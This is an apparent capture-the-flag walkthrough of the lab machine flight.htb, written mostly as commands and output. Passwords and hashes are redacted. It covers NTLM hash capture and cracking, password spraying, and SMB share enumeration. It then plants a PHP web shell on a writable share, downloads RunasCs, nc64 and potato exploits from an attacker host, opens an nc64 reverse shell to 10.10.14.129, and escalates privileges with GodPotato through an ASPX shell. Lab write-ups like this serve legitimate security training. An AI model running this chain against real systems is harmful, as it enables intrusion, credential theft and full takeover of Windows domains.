Target : flight.htb (10.129.228.120)
...
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:<REDACTED_NTLM_HASH>
```
...
svc_apache:<REDACTED_PASSWORD>:flight:<REDACTED_NTLM_HASH>

1 password hash cracked, 0 left
```

We got `flight:<REDACTED_PASSWORD>`

```bash
>  smbmap -H flight.htb -u 'svc_apache' -p '<REDACTED_PASSWORD>'
...
```bash
>  lookupsid.py 'flight.htb/svc_apache:<REDACTED_PASSWORD>@flight.htb' 2>/dev/null
...
```bash
>  nxc smb flight.htb -u /tmp/flight-users.txt -p '<REDACTED_PASSWORD>' --continue-on-success
...
SMB         10.129.228.120  445    G0               [-] flight.htb\Administrator:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\G0$:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:<REDACTED_PASSWORD>
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:<REDACTED_PASSWORD>
SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:<REDACTED_PASSWORD> STATUS_LOGON_FAILURE
```

We got a positive on Sailor Moon `S.Moon` on `SMB`.

```bash
>  smbmap -H flight.htb -u 'S.Moon' -p '<REDACTED_PASSWORD>'
...
[+] IP: 10.129.228.120:445     Name: flight.htb                Status: Authenticated
       ...
       Users                                                  READ ONLY
       Web                                                    READ ONLY
>  nxc smb flight.htb -u S.Moon -p '<REDACTED_PASSWORD>' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:<REDACTED_PASSWORD>
...
```bash
>  smbclient.py 'flight.htb/S.Moon:<REDACTED_PASSWORD>@flight.htb'
...
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:<REDACTED_NTLM_HASH>
```
...
c.bum:<REDACTED_PASSWORD>:flight.htb:<REDACTED_NTLM_HASH>

1 password hash cracked, 0 left
```

`c.bum:<REDACTED_PASSWORD>`

```bash
>  nxc smb flight.htb -u c.bum -p '<REDACTED_PASSWORD>' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:<REDACTED_PASSWORD>
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions            Remark
SMB         10.129.228.120  445    G0               -----           -----------            ------
SMB         10.129.228.120  445    G0               ADMIN$                                 Remote Admin
...
```bash
>  smbclient //flight.htb/Users -U 'c.bum%<REDACTED_PASSWORD>'
...
```bash
>  name="s$(date +%s).php"; printf '<?php echo "<pre>"; system($_GET["c"]); echo "</pre>"; ?>' > "/tmp/$name"; smbclient //flight.htb/Web -U 'c.bum%<REDACTED_PASSWORD>' -t 1200 -c "cd flight.htb; put /tmp/$name $name; ls $name; exit"
...
>  smbclient //flight.htb/Web -U 'c.bum%<REDACTED_PASSWORD>'
...
```bash
>  curl -G "http://flight.htb/$name" --data-urlencode 'c=powershell -c "iwr http://10.10.14.129:9000/RunasCs.exe -OutFile C:\Users\Public\Music\RunasCs.exe; iwr http://10.10.14.129:9000/nc64.exe -OutFile C:\Users\Public\Music\nc64.exe; iwr http://10.10.14.129:9000/SweetPotato.exe -OutFile C:\Users\Public\Music\SweetPotato.exe"'
```
...
```bash
>  name="s$(date +%s).php"; printf '<?php echo "<pre>"; system($_GET["c"]); echo "</pre>"; ?>' > "/tmp/$name"; smbclient //flight.htb/Web -U 'c.bum%<REDACTED_PASSWORD>' -t 1200 -c "cd flight.htb; put /tmp/$name $name; exit"; curl "http://flight.htb/$name?c=whoami"

putting file /tmp/s1783019638.php as \flight.htb\s1783019638.php (0.2 kB/s) (average 0.2 kB/s)
<pre>flight\svc_apache
</pre>%
>  curl -G "http://flight.htb/$name" --data-urlencode 'c=C:\Users\Public\Music\RunasCs.exe c.bum <REDACTED_PASSWORD> -l 2 "C:\Users\Public\Music\nc64.exe -e cmd.exe 10.10.14.129 9001"'
```
...
We then upload `GodPotato` since the AppPool identity grants us `SeImpersonatePrivilege` :
...
```bash
C:\Windows\system32>powershell -c "$f='g'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.aspx'; iwr http://10.10.14.129:9000/shell.aspx -OutFile ('C:\inetpub\development\'+$f); (iwr ('http://127.0.0.1:8000/'+$f+'?c=C:\Users\Public\Music\GodPotato-NET4.exe%20-cmd%20%22cmd%20/c%20whoami%20%3E%20C:\Users\Public\pwned2.txt%22') -UseBasicParsing).Content"

powershell -c "$f='g'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.aspx'; iwr http://10.10.14.129:9000/shell.aspx -OutFile ('C:\inetpub\development\'+$f); (iwr ('http://127.0.0.1:8000/'+$f+'?c=C:\Users\Public\Music\GodPotato-NET4.exe%20-cmd%20%22cmd%20/c%20whoami%20%3E%20C:\Users\Public\pwned2.txt%22') -UseBasicParsing).Content"
